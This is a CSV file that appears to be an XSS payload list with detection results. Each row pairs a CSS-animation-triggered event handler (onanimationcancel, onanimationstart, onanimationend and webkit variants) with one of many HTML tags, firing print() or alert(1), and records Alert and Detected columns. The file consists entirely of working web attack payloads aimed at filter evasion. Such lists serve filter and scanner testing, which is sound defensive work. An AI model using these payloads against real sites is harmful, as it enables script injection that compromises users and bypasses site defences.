Payload,Alert,Detected
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style=""position:absolute;"" onanimationcancel=""print()""></data>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""print()""></datalist>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""print()""></dd>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""print()""></del>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""print()""></details>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=""position:absolute;"" onanimationcancel=""print()""></dfn>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""print()""></dialog>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style=""position:absolute;"" onanimationcancel=""print()""></dir>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""print()""></div>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""print()""></dl>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""print()""></dt>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""print()""></element>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""print()""></em>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""print()""></embed>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""print()""></fieldset>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""print()""></figcaption>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""print()""></figure>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""print()""></font>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""print()""></footer>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""print()""></form>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""print()""></frame>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""print()""></frameset>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""print()""></h1>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=""position:absolute;"" onanimationcancel=""print()""></head>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""print()""></header>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></hgroup>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""print()""></hr>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style=""position:absolute;"" onanimationcancel=""print()""></html>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><i id=x style=""position:absolute;"" onanimationcancel=""print()""></i>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""print()""></iframe>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe2 id=x style=""position:absolute;"" onanimationcancel=""print()""></iframe2>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""print()""></image>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image2 id=x style=""position:absolute;"" onanimationcancel=""print()""></image2>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image3 id=x style=""position:absolute;"" onanimationcancel=""print()""></image3>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style=""position:absolute;"" onanimationcancel=""print()""></img>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img2 id=x style=""position:absolute;"" onanimationcancel=""print()""></img2>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""print()""></input>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input2 id=x style=""position:absolute;"" onanimationcancel=""print()""></input2>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input3 id=x style=""position:absolute;"" onanimationcancel=""print()""></input3>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input4 id=x style=""position:absolute;"" onanimationcancel=""print()""></input4>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""print()""></ins>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style=""position:absolute;"" onanimationcancel=""print()""></kbd>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style=""position:absolute;"" onanimationcancel=""print()""></keygen>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""print()""></label>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style=""position:absolute;"" onanimationcancel=""print()""></legend>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""print()""></li>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style=""position:absolute;"" onanimationcancel=""print()""></link>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style=""position:absolute;"" onanimationcancel=""print()""></listing>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><main id=x style=""position:absolute;"" onanimationcancel=""print()""></main>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""print()""></map>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style=""position:absolute;"" onanimationcancel=""print()""></mark>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style=""position:absolute;"" onanimationcancel=""print()""></marquee>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""print()""></menu>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""print()""></menuitem>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=""position:absolute;"" onanimationcancel=""print()""></meta>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style=""position:absolute;"" onanimationcancel=""print()""></meter>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""print()""></multicol>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style=""position:absolute;"" onanimationcancel=""print()""></nav>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style=""position:absolute;"" onanimationcancel=""print()""></nextid>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style=""position:absolute;"" onanimationcancel=""print()""></nobr>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style=""position:absolute;"" onanimationcancel=""print()""></noembed>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style=""position:absolute;"" onanimationcancel=""print()""></noframes>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=""position:absolute;"" onanimationcancel=""print()""></noscript>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""print()""></object>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=""position:absolute;"" onanimationcancel=""print()""></ol>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></optgroup>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""print()""></option>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style=""position:absolute;"" onanimationcancel=""print()""></output>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""print()""></p>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""print()""></param>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style=""position:absolute;"" onanimationcancel=""print()""></picture>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=""print()""></plaintext>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=""position:absolute;"" onanimationcancel=""print()""></pre>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style=""position:absolute;"" onanimationcancel=""print()""></progress>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""print()""></q>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""print()""></rb>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=""position:absolute;"" onanimationcancel=""print()""></rp>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style=""position:absolute;"" onanimationcancel=""print()""></rt>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""print()""></rtc>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style=""position:absolute;"" onanimationcancel=""print()""></ruby>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style=""position:absolute;"" onanimationcancel=""print()""></s>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""print()""></samp>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=""position:absolute;"" onanimationcancel=""print()""></script>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""print()""></section>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""print()""></select>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><set id=x style=""position:absolute;"" onanimationcancel=""print()""></set>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=""position:absolute;"" onanimationcancel=""print()""></shadow>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""print()""></slot>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""print()""></small>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=""position:absolute;"" onanimationcancel=""print()""></source>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style=""position:absolute;"" onanimationcancel=""print()""></spacer>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style=""position:absolute;"" onanimationcancel=""print()""></span>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strike id=x style=""position:absolute;"" onanimationcancel=""print()""></strike>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""print()""></strong>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""print()""></style>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""print()""></sub>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style=""position:absolute;"" onanimationcancel=""print()""></summary>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""print()""></sup>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style=""position:absolute;"" onanimationcancel=""print()""></svg>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""print()""></table>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style=""position:absolute;"" onanimationcancel=""print()""></tbody>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style=""position:absolute;"" onanimationcancel=""print()""></td>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style=""position:absolute;"" onanimationcancel=""print()""></template>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style=""position:absolute;"" onanimationcancel=""print()""></textarea>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=""position:absolute;"" onanimationcancel=""print()""></tfoot>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style=""position:absolute;"" onanimationcancel=""print()""></th>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=""position:absolute;"" onanimationcancel=""print()""></thead>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style=""position:absolute;"" onanimationcancel=""print()""></time>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""print()""></title>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style=""position:absolute;"" onanimationcancel=""print()""></tr>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style=""position:absolute;"" onanimationcancel=""print()""></track>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=""position:absolute;"" onanimationcancel=""print()""></tt>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style=""position:absolute;"" onanimationcancel=""print()""></u>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style=""position:absolute;"" onanimationcancel=""print()""></ul>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><var id=x style=""position:absolute;"" onanimationcancel=""print()""></var>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style=""position:absolute;"" onanimationcancel=""print()""></video>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video2 id=x style=""position:absolute;"" onanimationcancel=""print()""></video2>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style=""position:absolute;"" onanimationcancel=""print()""></wbr>",False,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style=""position:absolute;"" onanimationcancel=""print()""></xmp>",False,1
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationend=""alert(1)""></a>",False,1
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationstart=""alert(1)""></a>",False,1
"<style>@keyframes x{}</style><a style=""animation-name:x"" onwebkitanimationend=""alert(1)""></a>",False,1
"<style>@keyframes x{}</style><a style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></a>",False,1
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onanimationend=""alert(1)""></a2>",False,1
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onanimationstart=""alert(1)""></a2>",False,1
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></a2>",False,1
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></a2>",False,1
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",False,1
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationstart=""alert(1)""></abbr>",False,1
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onwebkitanimationend=""alert(1)""></abbr>",False,1
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></abbr>",False,1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationend=""alert(1)""></acronym>",False,1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationstart=""alert(1)""></acronym>",False,1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationend=""alert(1)""></acronym>",False,1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></acronym>",False,1
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",False,1
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",False,1
"<style>@keyframes x{}</style><address style=""animation-name:x"" onwebkitanimationend=""alert(1)""></address>",False,1
"<style>@keyframes x{}</style><address style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></address>",False,1
"<style>@keyframes x{}</style><animate style=""animation-name:x"" onanimationend=""alert(1)""></animate>",False,1
"<style>@keyframes x{}</style><animate style=""animation-name:x"" onanimationstart=""alert(1)""></animate>",False,1
"<style>@keyframes x{}</style><animate style=""animation-name:x"" onwebkitanimationend=""alert(1)""></animate>",False,1
"<style>@keyframes x{}</style><animate style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animate>",False,1
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onanimationend=""alert(1)""></animatemotion>",False,1
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onanimationstart=""alert(1)""></animatemotion>",False,1
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onwebkitanimationend=""alert(1)""></animatemotion>",False,1
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animatemotion>",False,1
"<style>@keyframes x{}</style><animatetransform style=""animation-name:x"" onanimationend=""alert(1)""></animatetransform>",False,1
"<style>@keyframes x{}</style><animatetransform style=""animation-name:x"" onanimationstart=""alert(1)""></animatetransform>",False,1
"<style>@keyframes x{}</style><animatetransform style=""animation-name:x"" onwebkitanimationend=""alert(1)""></animatetransform>",False,1
"<style>@keyframes x{}</style><animatetransform style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animatetransform>",False,1
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationend=""alert(1)""></applet>",False,1
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationstart=""alert(1)""></applet>",False,1
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onwebkitanimationend=""alert(1)""></applet>",False,1
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></applet>",False,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",False,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationstart=""alert(1)""></area>",False,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onwebkitanimationend=""alert(1)""></area>",False,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></area>",False,1
"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationend=""alert(1)""></article>",False,1
"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationstart=""alert(1)""></article>",False,1
"<style>@keyframes x{}</style><article style=""animation-name:x"" onwebkitanimationend=""alert(1)""></article>",False,1
"<style>@keyframes x{}</style><article style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></article>",False,1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",False,1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",False,1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onwebkitanimationend=""alert(1)""></aside>",False,1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></aside>",False,1
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",False,1
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",False,1
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onwebkitanimationend=""alert(1)""></audio>",False,1
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></audio>",False,1
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onanimationend=""alert(1)""></audio2>",False,1
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onanimationstart=""alert(1)""></audio2>",False,1
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></audio2>",False,1
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></audio2>",False,1
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationend=""alert(1)""></b>",False,1
